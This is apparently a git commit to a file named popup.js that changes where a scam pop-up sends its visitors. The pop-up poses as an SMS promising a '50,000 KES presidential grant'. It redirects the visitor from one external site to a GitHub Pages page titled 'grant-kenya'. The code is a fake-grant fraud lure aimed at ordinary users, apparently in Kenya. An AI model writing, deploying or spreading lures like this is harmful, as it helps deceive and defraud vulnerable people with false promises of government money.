d548ef3a8dc7b0a9b14727cd7958d24d06b19275
offersites <havast1920@gmail.com>
2024-11-30 12:35:37 +0100

    Update popup.js

--- popup.js
+++ popup.js
@@ -2,5 +2,5 @@
 var password = 'GET 50,000 KES'
 password=prompt('SMS :Get 50,000 KES presidentail grant now.   ','GET 50,000 KES');
 if (password != 'GET 50,000 KES') {
-location.href='https://damba-fest.org/drc-grant.html';
+location.href='https://offersites.github.io/grant-kenya';
 }
